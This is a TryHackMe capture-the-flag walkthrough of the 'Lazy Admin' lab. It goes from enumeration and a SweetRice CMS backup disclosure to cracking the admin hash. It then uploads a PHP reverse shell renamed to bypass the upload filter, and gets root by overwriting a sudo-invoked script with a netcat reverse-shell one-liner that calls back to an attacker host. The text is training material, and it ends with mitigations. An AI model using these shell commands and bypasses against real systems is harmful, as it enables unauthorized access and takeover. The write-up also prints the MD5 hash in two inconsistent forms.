# Lazy Admin – TryHackMe VAPT Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** August 27, 2025  
**Difficulty:** Easy  
**Category:** Web Exploitation & Privilege Escalation  
**Platform:** TryHackMe (THM)

---

## Part 1: User Flag

### 1. Reconnaissance & Initial Scanning

**Objective:** Identify all open ports and services running on the target system.

- **Command Used:**
  ```bash
  nmap -Pn -sC -sV -oN lazyadmin.nmap <target_ip>
  ```
- **Key Output:**
  ```bash
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.2p2 (Ubuntu)
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  ```
- **Analysis:** SSH and HTTP are available; the web server runs default Apache.

### 2. Web Enumeration

- Checked http://<target_ip>:80 in a browser:
  - Found Ubuntu Apache2 default page (no obvious custom content).
- **Used Gobuster for hidden directories:**
  ```bash
  gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
  - Discovered `/content` (redirect); `/server-status` (403 forbidden).

### 3. Deeper Enumeration of `/content` Directory

```bash
gobuster dir -u http://<target_ip>/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
- Found several subdirectories: `/images`, `/js`, `/inc`, `/as`, `/attachment`, `/_themes` (all redirect).
- Some scan errors (timeouts) indicated more content may exist.

### 4. Identifying the CMS

- Navigated to `/content` and found **SweetRice CMS** (vulnerable CMS).

### 5. Vulnerability Research

- Searched Exploit-DB for "SweetRice" vulnerabilities.
- Found **SweetRice 1.5.1 Backup Disclosure** (EDB-ID: 40718):
  - Direct access to backups at `/inc/mysql_backup/` and full site download via `/SweetRice-transfer.zip`.

### 6. Exploiting Backup Disclosure

- **Navigated:** 
  ```
  http://<target_ip>/content/inc/mysql_backup
  ```
- **Successfully found:** `mysql_backup_20191129023059-1.5.1.sql`.

- **Downloaded SQL backup:**
  ```bash
  wget http://<target_ip>/content/inc/mysql_backup/mysql_backup_20191129023059-1.5.1.sql
  ```
- **Inspected backup:**
  ```bash
  cat mysql_backup_20191129023059-1.5.1.sql
  ```
  - Found an MD5 hash for the manager/admin password:
    ```
    "42f749ade7f9e195bf475f37a44cafb"
    ```

### 7. Crack the Manager Password

- **Used CrackStation:**  
    ```
    Input hash: 42f749ade7f9e195bf475f37a44cafcb
    Output: Password123
    ```
- **Obtained credentials:**  
    - Username: `manager`
    - Password: `Password123`

### 8. Logging into SweetRice Admin Panel

- Navigated to the admin login page at `/content/as`
- Used credentials `"manager:Password123"` to access the admin area.

### 9. Uploading a PHP Reverse Shell

- **Downloaded reverse shell script:**  
    ```bash
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
    ```
- **Modified reverse shell:**
    - Set `$ip` to attacker's IP
    - Set `$port` to listening port
    - Renamed for bypass:
      ```bash
      mv php-reverse-shell.php shell.phtml
      ```
- **Uploaded shell in the admin panel "Media Center".**

- **Started netcat listener:**
    ```bash
    nc -lvnp <attack_port>
    ```
- **Triggered the uploaded shell by visiting its URL.**

### 10. Getting an Interactive Shell & Finding the User Flag

- **Upgraded shell:**
    ```python
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
- **Navigated:**
    - `cd /home`
    - `ls`
    - Found `itguy` user directory.

- **User Flag:**
    ```python
    cat /home/itguy/user.txt
    ```
    - **Output:** `THM{63e5bce9271952aad1113b6f1ac28a07}`

---

## Part 2: Root Flag (Privilege Escalation)

### 11. Sudo Privileges Enumeration

- **Checked sudo rights:**
    ```bash
    sudo -l
    ```
    - **Finding:** The user `www-data` can execute `/usr/bin/perl /home/itguy/backup.pl` as root.

### 12. Analyze Perl Script for Escalation Path

- **Read script:**  
    ```bash
    cat /home/itguy/backup.pl
    ```
    - The Perl script executes `/etc/copy.sh`.

- **Inspect `/etc/copy.sh`:**
    ```bash
    cat /etc/copy.sh
    ```
    - The script contains a reverse shell one-liner pointing to a different attacker IP.

### 13. Overwrite `copy.sh` with Own Reverse Shell

- **Write new shell command:**
    ```bash
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <attacker_port> > /tmp/f" > /etc/copy.sh
    ```

- **Start listener on attacker's machine:**
    ```bash
    nc -nvlp <attacker_port>
    ```

- **Trigger escalation:**
    ```bash
    sudo /usr/bin/perl /home/itguy/backup.pl
    ```
    - Reverse root shell obtained.

### 14. Retrieve the Root Flag

- **Get root flag:**
    ```bash
    ls /root
    cat /root/root.txt
    ```
    - **Output:** *(example)* `THM{rootflagcontents}`

---

## Mitigation Recommendations

- **Update/Remove vulnerable CMS software.**  
- **Eliminate backup disclosure:** Store backups outside web directories with proper access controls.
- **Use strong, salted hashes for passwords; avoid MD5.**
- **Restrict admin panel file uploads and validate file types.**
- **Review and restrict sudo command configurations, especially for scripts and interpreters.**
- **Sanitize and log all script interactions and privileged command executions.**

---

## Lessons Learned

- Outdated file management and poor backup hygiene expose credentials and sensitive files.
- Weak password hashing allows trivial brute-force attacks.
- Improper server-side script chaining gives easy privilege escalation routes.
- Web upload restrictions can often be bypassed using alternate file extensions.

---

## Skills Practiced

- Enumeration: nmap, gobuster
- Web Exploitation: directory fuzzing, file disclosure, password cracking
- Command Execution: reverse shell upload/exploit
- Privilege Escalation: abusing root-allowed scripts and overwriting vulnerable bash scripts
```
